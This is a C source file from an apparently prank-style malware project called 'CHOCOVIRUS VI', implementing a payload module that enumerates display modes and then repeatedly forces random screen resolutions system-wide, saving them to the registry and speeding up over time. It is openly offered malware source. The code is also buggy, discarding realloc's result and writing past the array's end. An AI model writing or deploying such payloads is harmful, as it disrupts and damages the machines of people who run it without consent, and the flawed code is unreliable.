//
// CHOCOVIRUS VI
// (C) 2019 modeco80 and CHOCOLATEMAN.
//
// File:
//		ResFuckPayload.c
//
// Description:
//		Resolution fuck payload
//

#include "Common.h"
#include "PayloadMan.h"
#include "RegUtil.h"
#include <stdlib.h>
#include <math.h>

// Display resolution data.
typedef struct {
	DWORD height, width, bits, rotation, hz;
} ResFuckDisplayMode;

DEVMODE devmode;

// Count of items in the AllModes dynamic array.
int AllModesCount;
// Dynamic array of all display modes that are valid
ResFuckDisplayMode* AllModes;

// 
float x = 1.0f;

BOOL Cond_ResFuck(void* This) {
	return TRUE;
}

void Init_ResFuck(void* This) {
	AllModesCount = 5;
	AllModes = calloc(AllModesCount, sizeof(ResFuckDisplayMode));
	devmode.dmSize = sizeof(DEVMODE);
	for (int i = 0; EnumDisplaySettings(NULL, i, &devmode); ++i) {
		if (i > AllModesCount) {
			// Reallocate array if it's too small
			AllModesCount = i;
			realloc(AllModes, i * sizeof(ResFuckDisplayMode));
		}
		BLITZ_DEBUG_LOG("Adding mode %lu x %lu (%d)", devmode.dmPelsWidth, devmode.dmPelsHeight, i)
		ResFuckDisplayMode dm = {
			devmode.dmPelsHeight,
			devmode.dmPelsWidth,
			devmode.dmBitsPerPel,
			devmode.dmDisplayOrientation,
			devmode.dmDisplayFrequency
		};
		AllModes[i] = dm;
	}
}

void Work_ResFuck(void* This) {
	ResFuckDisplayMode dm = AllModes[rand() % AllModesCount];

	// Make a new mode with the data from the mode we selected.
	DEVMODE mode = devmode;
	mode.dmPelsHeight = dm.height;
	mode.dmPelsWidth = dm.width;
	mode.dmBitsPerPel = dm.bits;
	mode.dmDisplayFrequency = dm.hz;

	BLITZ_DEBUG_LOG("Changing current mode to (%lu x %lu)", dm.width, dm.height)
	ChangeDisplaySettings(&mode, CDS_UPDATEREGISTRY|CDS_GLOBAL);
	Sleep(pow(0.95, x++) * 10000);
}

BlitzPayload ResFuck = {
	"ResFuck",
	Cond_ResFuck,
	Init_ResFuck,
	Work_ResFuck
};